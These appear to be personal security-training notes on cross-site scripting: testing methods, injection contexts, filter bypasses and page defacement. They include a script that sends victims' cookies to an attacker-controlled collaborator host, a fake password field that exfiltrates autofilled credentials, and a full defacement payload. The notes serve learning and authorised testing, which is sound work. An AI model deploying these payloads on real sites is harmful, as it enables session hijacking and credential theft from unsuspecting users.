Cross-Site Scripting (XSS)359 is a vulnerability that exploits a user’s trust in a website by dynamically injecting JS  content into the page rendered by the user’s browser.

Tools used for automation : Dalfox, XSStrike, xsshunter, XSSER, OWASPZap, Nikto, BruteXSS, XSSer

#### Types of XSS:
- **Stored XSS attacks**: also known as Persistent XSS, occur when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone who visits a vulnerable page. Stored XSS vulnerabilities often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later. This occurs when malicious scripts are permanently stored on a web server, usually in a database. When other users visit the affected page, the script runs automatically.
 
- **DOM-Based XSS (Document Object Model-Based Cross-Site Scripting)** :is a specific type of XSS vulnerability that happens entirely on the client side. Unlike other types of XSS (Stored or Reflected), which rely on a server response containing the malicious code, DOM-Based XSS occurs when a website’s client-side JavaScript modifies the page’s DOM using untrusted data directly from sources like URL parameters, form inputs, or cookies, without adequate validation or sanitization.

---
## Identify XSS:

We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitized input, which is then displayed as output in subsequent pages.

#### Testing Process for XSS Vulnerabilities

1. **Locate Input Fields**: Identify places where user input is accepted, like search bars, form fields, or URL parameters. These fields are potential entry points for XSS.
    
2. **Inject Special Characters**: Input the special characters (e.g., `<`, `>`, `{`, `}`, `'`, `"`, `;`) into these fields to see if they return unmodified in the output.
    
3. **Observe the Output**: If the characters are displayed directly in the page or in an unexpected way, it suggests the input is not sanitized or encoded properly.
    
4. **Craft a Simple XSS Payload**: If initial tests with special characters suggest the page might be vulnerable, try crafting a payload such as `<script>alert('XSS')</script>` to see if the script executes. Successful execution confirms an XSS vulnerability.
#### How to Find and test for stored xss vulns:
- Analyze http headers
- Identify where user-supplied data is reflected in the application response which could be visible to other users
- Look for pages with user generated content like profiles, comments or logs which may store and display user input
- input specific easily identifiable values into each entry point& monitor where these values appear in application

#### Testing for DOM-Based XSS

- For **URL-based parameters**: Add unique input to the parameter, then use developer tools to locate this input in the DOM. Check if it’s processed in a way that could allow code execution.
- For **non-URL-based sources** (like `document.cookie`) or other sinks (e.g., `setTimeout`): Review the JavaScript code manually, as these are harder to detect automatically.

---
## Reflected XSS:


Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
### Finding and Testing for Reflected XSS Vulnerabilities

#### 1. Identify Entry Points

- **Parameters**: Check all parameters in the URL query string, path parameters, and the message body of POST requests.
- **HTTP Headers**: Consider headers like `Referer`, `User-Agent`, `Cookie`, and any custom headers that might reflect input.

#### 2. Initial Testing with Random Values

- **Submit Random Values**: Use alphanumeric strings of about 8 characters to test each entry point.
- **Automation with Burp Intruder**: Utilize Burp Intruder to automate the submission of these random values:
    - Set up number payloads to generate random hex values.
    - Use grep payloads to highlight responses containing the submitted values.

#### 3. Analyze Reflection Context

- **Response Examination**: For each reflected value, analyze its context:
    - Is it within HTML content, JavaScript, or attributes?
    - Pay attention to whether it’s enclosed in quotes or not.

#### 4. Testing Candidate Payloads

- **Payload Injection**: Send the request to Burp Repeater:
    - Insert a simple XSS payload (like `<script>alert(1)</script>`) in the identified reflection context.
    - Keep the random value in place to assist in locating the reflection in the response.
- **Response Analysis**: Check the response for successful execution of the payload.

#### 5. Iterate with Alternative Payloads

- If the initial payload is modified or blocked:
    - Test alternative payloads based on the reflection context.
    - Explore different encoding techniques or payload variations.

#### 6. Final Testing in a Browser

- **Browser Execution**: Once a payload works in Burp Repeater:
    - Execute it in a real browser to confirm execution.
    - Start with simple JavaScript like `alert(document.domain)` to see immediate feedback.


#### Impact:
- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.
---
## Stored XSS:
- **Identify Entry Points**:
    
    - **Parameters**: Look for any fields where users can input data. This includes:
        - **URL Query Strings**: Data sent in the URL after `?`, e.g., `example.com/search?query=test`.
        - **Path Parameters**: Variables in the URL path, e.g., `example.com/user/123`.
        - **POST Data**: Data sent in the body of a POST request, typically from forms.
    - **HTTP Headers**: Check if any headers can accept user input, such as:
        - `Referer`, `User-Agent`, or custom headers.
    - **Out-of-Band Routes**: Identify any non-standard ways users can input data into the application, like:
        - Email submissions in webmail applications.
        - Third-party content (e.g., tweets in a social media aggregator).
- **Identify Exit Points**:
    
    - **Response Analysis**: Any place where user-generated data might appear in the application's responses:
        - Web pages that display user comments, user profiles, or logs.
        - Messages or notifications returned after user actions.
- **Link Entry and Exit Points**:
    
    - **Data Flow Mapping**: Understand how data flows from the entry points to the exit points:
        - Any user input can potentially show up in various parts of the application.
        - For example, a username submitted in a profile form might be displayed in a comment section or user logs.
- **Systematic Testing**:
    
    - **Submit Test Values**: Enter a specific value (like a test username or comment) into each entry point and observe the responses:
        - Focus on areas where you expect user-generated content (comments, user profiles).
        - Keep track of where the data appears in the responses.
    - **Check for Persistence**: Confirm that the data remains accessible across different requests, not just in the immediate response.
- **Testing for Vulnerabilities**:
    
    - **Payload Injection**: Once you find that user data is stored, insert XSS payloads into the entry points:
        - Use simple XSS scripts like `<script>alert('XSS')</script>` to see if they execute.
    - **Contextual Testing**: Depending on where the data appears in the response (HTML, JavaScript, etc.), tailor your payloads:
        - If the data is displayed within HTML, ensure it’s inserted as text.
        - If within JavaScript, ensure the payload is formatted to execute in that context.


## XSS Context

When testing for reflected and stored XSS, a key task is to identify the XSS context:

- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.

	### **XSS between HTML Tags:**
	WAF protects against common xss vectors ie tags and attributes. if a site has reflected xss but standard payloads are blocked by WAF
	### Tags
	
	**Tags** are the building blocks of HTML. They are used to create elements on a webpage. An HTML tag usually consists of an opening tag and a closing tag, with content between them.
	
	- **Opening Tag**: Indicates the beginning of an element.
	- **Closing Tag**: Indicates the end of an element. It is similar to the opening tag but includes a forward slash (`/`).
	### Attributes
	
	**Attributes** provide additional information about an HTML element. They are always specified in the opening tag and come in name/value pairs.
	
	- **Name**: The name of the attribute.
	- **Value**: The value assigned to the attribute.
	we can use burp intruder to brute force tags first via xss cheat sheet and Even if tag is valid some attributes are not allowed so  attributes later based on that we can construct our attack

	### **Reflected XSS into HTML context with all tags blocked except custom ones**
	so in this all  tags are blocked so we will check whether it will access custom tags or not


	##### **Reflected XSS with event handlers and `href` attributes blocked**
	some websites whitelist tags which only they allow when event handlers and href attributes are blocked. We can use a certain tag but cant use an attribute we want. we can use xss cheat sheet along with burp to brute force allowed attributes and search how to use them. filter based on status code and length


	### **Reflected XSS with some SVG markup allowed:**
	same as prev advice jus reseach and look to insert tags in other tags
	

	#### XSS in HTML tag attributes
	XSS is a type of security vulnerability where an attacker can inject malicious scripts into a web page. When this happens in HTML tag attributes, it often involves tricking the browser into executing JavaScript when certain actions occur, like when an element gets focus or is clicked.
	**Breaking Out of Attribute Values**:

- If you can close an attribute value with a double quote (`"`), you can then add new attributes or scripts. For example:
```
"><script>alert(document.domain)</script>
```

 Angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler.
**Using Event Handlers**:

- Instead of just injecting a script tag, an attacker can add event handlers to existing HTML elements. This is often more effective because many web applications try to block direct script injection.
```
" autofocus onfocus=alert(document.domain) x="
```
**Breaking it down**:

- `"`: Closes the existing attribute.
- `autofocus`: An HTML attribute that automatically focuses on the element.
- `onfocus=alert(document.domain)`: This adds a JavaScript command that will run when the element gets focused (like when a user clicks or tabs to it).
- `x="`: This extra part helps ensure the rest of the HTML remains valid.

Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:

```
<a href="javascript:alert(document.domain)">
```
### List of HTML Attributes for JavaScript Execution

1. **Mouse Events**:
    
    - `onclick`: Executes when an element is clicked.
    - `ondblclick`: Executes when an element is double-clicked.
    - `onmousedown`: Executes when a mouse button is pressed down on an element.
    - `onmouseup`: Executes when a mouse button is released over an element.
    - `onmouseover`: Executes when the mouse pointer moves over an element.
    - `onmouseout`: Executes when the mouse pointer leaves an element.
    - `onmousemove`: Executes when the mouse pointer moves within an element.
2. **Keyboard Events**:
    
    - `onkeydown`: Executes when a key is pressed down.
    - `onkeypress`: Executes when a key is pressed and released (deprecated in favor of `onkeydown` and `onkeyup`).
    - `onkeyup`: Executes when a key is released.
3. **Form Events**:
    
    - `onsubmit`: Executes when a form is submitted.
    - `onreset`: Executes when a form is reset.
    - `onchange`: Executes when the value of an element changes.
    - `onfocus`: Executes when an element receives focus.
    - `onblur`: Executes when an element loses focus.
    - `oninput`: Executes when the value of an `<input>`, `<textarea>`, or `<select>` changes.
    - `onselect`: Executes when text is selected in a `<textarea>` or `<input>`.
4. **Window Events**:
    
    - `onload`: Executes when the page has finished loading.
    - `onunload`: Executes when the user leaves the page.
    - `onresize`: Executes when the browser window is resized.
    - `onscroll`: Executes when the document is scrolled.
5. **Media Events** (for audio/video elements):
    
    - `onplay`: Executes when the media starts playing.
    - `onpause`: Executes when the media is paused.
    - `onended`: Executes when the media has finished playing.
    - `onvolumechange`: Executes when the volume changes.
    - `onerror`: Executes when an error occurs while loading the media.
6. **Touch Events** (for mobile devices):
    
    - `ontouchstart`: Executes when a touch point is placed on the touch surface.
    - `ontouchmove`: Executes when a touch point is moved along the touch surface.
    - `ontouchend`: Executes when a touch point is removed from the touch surface.
    - `ontouchcancel`: Executes when a touch event is interrupted.
7. **Other Events**:
    
    - `oncontextmenu`: Executes when the right mouse button is clicked (context menu).
    - `ondrag`: Executes when an element is being dragged.
    - `ondragstart`: Executes when the user starts dragging an element.
    - `ondragend`: Executes when the user stops dragging an element.
    - `ondragover`: Executes when a dragged element is being dragged over a valid drop target.
    - `ondrop`: Executes when a dragged element is dropped on a valid drop target.

#### Exploiting XSS via Access Key Injection in HTML Attributes
- The `accesskey` attribute in HTML allows developers to define keyboard shortcuts for navigating to or activating elements on a webpage. When a user presses the specified combination of keys, the associated element is activated as if it were clicked.
- Some websites may encode angle brackets (`<` and `>`) to prevent direct HTML injection, but still allow certain attributes to be injected. This can create opportunities for XSS (Cross-Site Scripting) or other types of injection attacks.
- If you can inject attributes into tags that are not normally interactive (like a `<link>` tag for canonical URLs), you might be able to use `accesskey` to invoke JavaScript functions indirectly. For example, if you manage to insert an `accesskey` attribute into a canonical tag, it may not trigger actions by itself but can interact with the browser's focus mechanism.
##### Example:
```
<link rel="canonical" href="https://www.example.com" accesskey="x" onfocus="alert('Injected!')">
```
If a user focuses on this element (perhaps by pressing the `Alt` + `X` keys), the JavaScript function in the `onfocus` attribute would execute, triggering the alert. we need tto insert it via url

#### XSS into Javascript:
When the XSS context is some existing JavaScript within the response

#### Terminating existing  script:
An attacker can often break out of existing `<script>` tags to inject their own HTML and JavaScript.

Absolutely, you’re spot on! Let’s delve deeper into the concept of terminating existing scripts in an XSS context, explaining how it works and providing some additional insights.

### Terminating Existing Script Contexts

In scenarios where XSS is possible, an attacker can often break out of existing `<script>` tags to inject their own HTML and JavaScript. This method is particularly effective due to the way browsers process HTML and JavaScript. Here’s how it typically works:

1. **HTML Parsing vs. JavaScript Parsing**:
    
    - When a web page is loaded, the browser first parses the HTML structure. It identifies elements like `<script>`, `<div>`, `<img>`, etc.
    - After determining the HTML structure, it then processes the JavaScript code inside the script blocks.
2. **Breaking Out of Script Tags**:
    
    - An attacker can exploit this difference by injecting a payload that terminates the original `<script>` tag. By doing this, they can introduce new HTML elements that can trigger JavaScript execution.
    - The key is to properly close the existing script tag and then introduce their own HTML element that contains JavaScript.

### Example Payload

Given an XSS context like this:

`<script> var input = 'controllable data here'; </script>`

An attacker could use the following payload:
`</script><img src=1 onerror=alert(document.domain)>`

### Breakdown of the Payload:

- **`</script>`**: This closes the existing script context. It effectively tells the browser that the previous script block is finished, which means any subsequent HTML is treated as regular HTML, not part of the JavaScript.
- **`<img src=1 onerror=alert(document.domain)>`**: This creates an `<img>` element with an `onerror` event handler. Since the `src` attribute is set to an invalid value (1), it triggers the `onerror` event immediately, executing the `alert(document.domain)` code. This displays the domain of the current page.

### Breaking out of a JavaScript string

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

**Breaking out of a string literal** means finding a way to escape the quotes so you can execute additional JavaScript code instead of just using the string.

Some useful ways of breaking out of a string literal are:

`'-alert(document.domain)-' ';alert(document.domain)//`
Here, the semicolon (`;`) ends the first statement, and `alert(document.domain)` is a new statement that gets executed. The `//` comments out anything that follows, preventing syntax errors.


#### Making use of HTML-encoding
Using HTML encoding in XSS exploits is a technique to bypass filters that restrict certain characters, like single quotes (`'`) or double quotes (`"`), by encoding them as HTML entities. This technique can help inject JavaScript into an HTML attribute even when character-based filtering is in place.

Example of HTML Encoding in an XSS Attack:
```
<a href="#" onclick="... var input='controllable data here'; ...">
```
If single quotes (`'`) are blocked, you can use the HTML entity `&apos;` (which represents a single quote) to bypass this restriction. 
For example:
```
<a href="#" onclick="... var input='&apos;-alert(document.domain)-&apos;'; ...">
```
When the browser parses this code:

1. **HTML Decoding**: The `&apos;` entity is decoded to a single quote (`'`).
2. **Breaking Out of the String**: This decoded single quote ends the original `input` string in `var input='`.
3. **Injecting JavaScript**: The code `-alert(document.domain)-` is now interpreted as JavaScript. When executed, it displays an alert showing the domain name.

So, effectively:

- `&apos;` allows the attacker to close the string in the `onclick` attribute.
- `-alert(document.domain)-` is executed, bypassing the character restriction set by the application.

#### XSS in JavaScript template literals
**JavaScript Template Literals** are a feature introduced in ES6 that allow for easier and more flexible string handling.

Template literals are defined using backticks (`` ` ``) instead of single quotes (`'`) or double quotes (`"`).

```
const message = `Hello, World!`;
```
You can create strings that span multiple lines without needing to use escape characters.

```
const multiLine = `This is a string
that spans multiple lines.`;
```
You can use any valid JavaScript expression inside the `${...}`. This includes calculations, function calls, and more

```
const name = 'Alice';
const greeting = `Hello, ${name}!`;
console.log(greeting); // Output: Hello, Alice!
```
**Cross-Site Scripting (XSS) in JavaScript Template Literals** is a vulnerability that arises when user input is directly embedded into JavaScript code using template literals without proper validation or sanitization. This allows an attacker to inject and execute arbitrary JavaScript code within the context of the web application.

### How XSS Occurs with Template Literals

When an application uses template literals to dynamically construct JavaScript code or output and includes user-controlled data without sanitization, it becomes vulnerable to XSS.

```
<script>
    var userInput = `controllable data here`; // Example of user input
    var output = `User input is: ${userInput}`;
    document.getElementById('output').innerText = output;
</script>
```

If an attacker is able to manipulate `userInput`, they could inject malicious JavaScript code.
```
var userInput = `${alert('XSS Attack!')}`;
```

#### Exploiting XSS Vulnerabilities:

##### To Steal Cookies:
we can exploit xss to send cookies to our own domain ie the server in our control. Manually inject cookies into our own browser and impersonate the victim.
**Limitations**:
- Many Applications hide their cookies from js
- Session might timeout or blocked
 - doument.cookie is used to steal cookies
 - fetch api is used to send a post request to our server

```
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', 
{ method: 'POST', 
mode: 'no-cors', body:document.cookie 
}); 
</script>
```
This script will make anyone who view the comments issue a post request containing their cookie to their subdomain

#### Capturing Passwords:
- most people use to auto-fill passwords ie password manager.
- we can create a password form input,reading out and sending it to our own domain via post req
- only works when people  use password manager that does auto fill
- Need to create a input form along with fetch api to post username& password to us

```
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST',
mode: 'no-cors', 
body:username.value+':'+this.value 
});">
```
# DOM-based XSS
Tools: DOM xss scanner in burp
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.


Here are **clean, organized notes** for your **Stored XSS Web Defacement** walkthrough, focusing on the **main HTML elements** used for changing page appearance and **JavaScript payloads**:

---

### XSS Web Defacement via JavaScript
Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`
---

#### Change Background Color
###### JavaScript:

```html
<script>document.body.style.background = "#141d2b"</script>
```

- Sets background color to Hack The Box's default (dark blue).
- Can use any hex or named color (e.g., `"black"`).
#### Change Background Image

##### JavaScript:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

- Sets a background image instead of color.
#### Change Page Title

#####  JavaScript:

```html
<script>document.title = "HackTheBox Academy"</script>
```

- Replaces the title in the browser tab.
- `document.title` is a read/write property.
#### Change Body Text / HTML
#####  a. Change content of specific element:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```
##### b. jQuery equivalent (if available):

```javascript
$("#todo").html("New Text")
```
##### c. Replace entire body with custom HTML:

```html
<script>
document.getElementsByTagName('body')[0].innerHTML = 
    '<center><h1 style="color: white">Cyber Security Training</h1>' +
    '<p style="color: white">by ' +
    '<img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">' +
    '</p></center>'
</script>
```

- Completely replaces page content with custom message and logo.
- `document.getElementsByTagName('body')[0]` selects the `<body>` tag.

#### Combined Defacement Payload Example

```html
<script>
document.body.style.background = "#141d2b";
document.title = "HackTheBox Academy";
document.getElementsByTagName('body')[0].innerHTML = 
    '<center><h1 style="color: white">Cyber Security Training</h1>' +
    '<p style="color: white">by ' +
    '<img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">' +
    '</p></center>';
</script>
```

####  Tips
- Always **test your final payload locally** before using.
- **Minify your code** to fit into limited injection fields.
- You can remove or hide other elements if needed (e.g., `document.getElementById("reset").remove();`).
- Combine JavaScript for max effect while avoiding detection.

what more we can do
- Phishing
- session Hijacking